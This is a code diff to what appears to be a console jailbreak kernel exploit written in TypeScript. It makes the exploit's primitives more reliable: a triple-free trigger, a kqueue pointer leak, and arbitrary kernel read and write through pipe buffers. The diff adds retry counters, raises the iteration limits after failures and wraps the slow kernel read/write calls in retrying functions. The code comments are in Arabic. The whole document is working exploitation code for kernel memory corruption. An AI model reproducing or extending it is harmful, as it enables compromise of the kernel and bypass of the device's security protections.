@@ -3,6 +3,7 @@ import { libc_addr } from 'download0/userland'
 import { get_fwversion, hex, malloc, read16, read32, read64, send_notification, write16, write32, write64, write8, get_kernel_offset, kernel, jailbreak_shared, read8 } from 'download0/kernel'
 import { show_success, run_binloader } from 'download0/loader'
 
+
 // include('userland.js')
 
 if (typeof libc_addr === 'undefined') {
@@ -158,6 +159,13 @@ const F_SETFL = 4
 const O_NONBLOCK = 4
 
 let FW_VERSION: string | null = null // Needs to be initialized to patch kernel
+let leak_kqueue_failures = 0
+let kreadslow_failures = 0
+let kwriteslow_failures = 0
+
+const MAX_LEAKKQ_FAIL   = 3      // بعدهم نعلن فشل نهائي
+const MAX_KREAD_FAIL    = 2      // عدد محاولات kreadslow قبل ما نرجع false
+const MAX_KWRITE_FAIL   = 2      // عدد محاولات kwriteslow قبل ما نرجع false
 
 /***************************/
 /*      Used constiables     */
@@ -1027,6 +1035,7 @@ function exploit_phase_trigger () {
   log('Triggering vulnerability (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...')
 
   if (!trigger_ucred_triplefree()) {
+    // فشل في triple free → نعيد المحاولة من نفس الفيز
     yield_to_render(exploit_phase_trigger)
     return
   }
@@ -1082,7 +1091,7 @@ function setup_arbitrary_rw () {
   write32(master_pipe_buf.add(0x0C), PAGE_SIZE)        // size
   write64(master_pipe_buf.add(0x10), victim_r_pipe_data)  // buffer
 
-  const ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE)
+  const ret_write = kwriteslow_safe(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE)
 
   if (ret_write.eq(BigInt_Error)) {
     cleanup()
@@ -1475,13 +1484,17 @@ function leak_kqueue () {
   const magic_add = leak_rthdr.add(0x08)
 
   let count = 0
-  const MAX_KQ = 5000
+  let MAX_KQ = KQUEUE_ITERATIONS   // 5000 عندك فوق
+
+  // لو حصل فشل سابق كتير نزود الحد شوية
+  if (leak_kqueue_failures >= 1) MAX_KQ = 8000
+  if (leak_kqueue_failures >= 2) MAX_KQ = 12000
 
   while (count < MAX_KQ) {
     count++
 
     if (count % 500 === 0) {
-      debug('leak_kqueue iter=' + count)
+      debug('leak_kqueue iter=' + count + ' (MAX=' + MAX_KQ + ')')
     }
 
     kq = kqueue()
@@ -1489,7 +1502,8 @@ function leak_kqueue () {
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100)
 
     const magic_ok = read64(magic_add).eq(magic_val)
-    const fdp_ok = !read64(leak_rthdr.add(0x98)).eq(0)
+    const fdp = read64(leak_rthdr.add(0x98))
+    const fdp_ok = !fdp.eq(0)
 
     if (magic_ok && fdp_ok) {
       debug('leak_kqueue: magic + fdp OK at iter ' + count)
@@ -1501,7 +1515,8 @@ function leak_kqueue () {
   }
 
   if (count >= MAX_KQ) {
-    log('leak_kqueue: exceeded MAX_KQ iterations')
+    log('leak_kqueue: exceeded MAX_KQ iterations (' + MAX_KQ + ')')
+    leak_kqueue_failures++
     return false
   }
 
@@ -1510,6 +1525,7 @@ function leak_kqueue () {
 
   if (kq_fdp.eq(0)) {
     log('Failed to leak kqueue_fdp')
+    leak_kqueue_failures++
     return false
   }
 
@@ -1517,20 +1533,28 @@ function leak_kqueue () {
 
   close(kq)
 
+  // إعادة ضبط الفشل بعد نجاح
+  leak_kqueue_failures = 0
+
   triplets[1] = find_triplet(triplets[0], triplets[2])
 
   return true
 }
 
-
-function leak_kqueue_safe() {
+function leak_kqueue_safe () {
   try {
-    return leak_kqueue()
+    const ok = leak_kqueue()
+    if (!ok) {
+      log('leak_kqueue_safe() failed (attempts=' + leak_kqueue_failures + ')')
+    }
+    return ok
   } catch (e) {
     log('leak_kqueue_safe ERROR: ' + (e as Error).message)
+    leak_kqueue_failures++
     return false
   }
 }
+
 
 function kreadslow64 (address: BigInt) {
   const buffer = kreadslow(address, 8)
@@ -1543,15 +1567,32 @@ function kreadslow64 (address: BigInt) {
 }
 
 function kreadslow64_safe (address: BigInt): BigInt {
-  const buffer = kreadslow(address, 8)
+  for (let attempt = 1; attempt <= MAX_KREAD_FAIL; attempt++) {
+    const buffer = kreadslow(address, 8)
 
-  if (buffer.eq(BigInt_Error)) {
-    log('kreadslow64_safe: kreadslow returned BigInt_Error at addr ' + hex(address))
-    cleanup()
-    throw new Error('Netctrl failed - Reboot and try again')
+    if (buffer.eq(BigInt_Error)) {
+      kreadslow_failures++
+      log('kreadslow64_safe: kreadslow returned BigInt_Error at addr ' +
+          hex(address) + ' (attempt ' + attempt + '/' + MAX_KREAD_FAIL + ')')
+
+      // لو الذاكرة خلصت أو cleanup اشتغل، نخرج فورًا
+      if (cleanup_called) {
+        throw new Error('Netctrl failed - Reboot and try again')
+      }
+
+      // ندي الـ kernel فرصة يهدى
+      nanosleep_fun(5_000_000) // 5ms
+      continue
+    }
+
+    // نجاح
+    kreadslow_failures = 0
+    return read64(buffer)
   }
 
-  return read64(buffer)
+  // لو وصلنا هنا يبقى كل المحاولات فشلت
+  cleanup()
+  throw new Error('Netctrl failed - Reboot and try again')
 }
 
 function build_uio (uio: BigInt, uio_iov: BigInt, uio_td: number, read: boolean, addr: BigInt, size: number) {
@@ -1901,6 +1942,31 @@ function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
   read(new BigInt(iov_sock_0), tmp, 1)
 
   return new BigInt(0)
+}
+
+function kwriteslow_safe (addr: BigInt, buffer: BigInt, size: number): BigInt {
+  for (let attempt = 1; attempt <= MAX_KWRITE_FAIL; attempt++) {
+    const ret = kwriteslow(addr, buffer, size)
+
+    if (ret.eq(BigInt_Error)) {
+      kwriteslow_failures++
+      log('kwriteslow_safe: kwriteslow returned BigInt_Error at addr ' +
+          hex(addr) + ' (attempt ' + attempt + '/' + MAX_KWRITE_FAIL + ')')
+
+      if (cleanup_called) {
+        throw new Error('Netctrl failed - Reboot and try again')
+      }
+
+      nanosleep_fun(5_000_000) // 5ms
+      continue
+    }
+
+    kwriteslow_failures = 0
+    return ret
+  }
+
+  cleanup()
+  throw new Error('Netctrl failed - Reboot and try again')
 }
 
 function rop_regen_and_loop (last_rop_entry: BigInt, number_entries: number) {
